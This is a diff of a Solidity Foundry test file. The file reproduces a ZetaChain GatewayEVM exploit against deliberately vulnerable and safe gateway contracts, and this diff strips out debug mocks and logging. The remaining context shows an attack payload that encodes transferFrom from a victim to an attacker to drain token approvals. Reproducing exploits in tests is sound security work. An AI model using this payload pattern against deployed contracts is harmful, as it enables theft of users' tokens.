@@ -1,45 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-import {Test, console2} from "forge-std/Test.sol";
+import {Test} from "forge-std/Test.sol";
 import {MockERC20} from "./mocks/MockERC20.sol";
-
-/// Debug version of MockERC20 with event logging
-contract DebugMockERC20 {
-    string public name = "Mock";
-    string public symbol = "MOCK";
-    uint8 public decimals = 18;
-    uint256 public totalSupply;
-    mapping(address => uint256) public balanceOf;
-    mapping(address => mapping(address => uint256)) public allowance;
-
-    event TransferFromDebug(address indexed from, address indexed to, uint256 amount, address indexed caller, uint256 allowanceBefore);
-
-    function mint(address to, uint256 amount) external {
-        balanceOf[to] += amount;
-        totalSupply += amount;
-    }
-
-    function approve(address spender, uint256 amount) external returns (bool) {
-        allowance[msg.sender][spender] = amount;
-        return true;
-    }
-
-    function transfer(address to, uint256 amount) external returns (bool) {
-        balanceOf[msg.sender] -= amount;
-        balanceOf[to] += amount;
-        return true;
-    }
-
-    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
-        uint256 a = allowance[from][msg.sender];
-        emit TransferFromDebug(from, to, amount, msg.sender, a);
-        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
-        balanceOf[from] -= amount;
-        balanceOf[to] += amount;
-        return true;
-    }
-}
 import {VulnerableGatewayEVM, SafeGatewayEVM, IERC20} from "../src/zeta/GatewayEVM.sol";
 
 /// PoC for ZetaChain GatewayEVM exploit (April 2026, $333K).
@@ -72,20 +35,6 @@ contract ZetaGatewayEVMTest is Test {
         return abi.encodeWithSignature(
             "transferFrom(address,address,uint256)", victim, attacker, VICTIM_BAL
         );
-    }
-
-    function test_mockERC20_transferFrom() public {
-        // Test that MockERC20 transferFrom works when called by a third party
-        address thirdParty = makeAddr("thirdParty");
-        
-        vm.prank(victim);
-        token.approve(thirdParty, type(uint256).max);
-        console2.log("allowance[victim][thirdParty]:", token.allowance(victim, thirdParty));
-        
-        vm.prank(thirdParty);
-        token.transferFrom(victim, thirdParty, 1000e18);
-        console2.log("victim balance:", token.balanceOf(victim));
-        console2.log("thirdParty balance:", token.balanceOf(thirdParty));
     }
 
     function test_vulnerableGateway_drainsApproval() public {
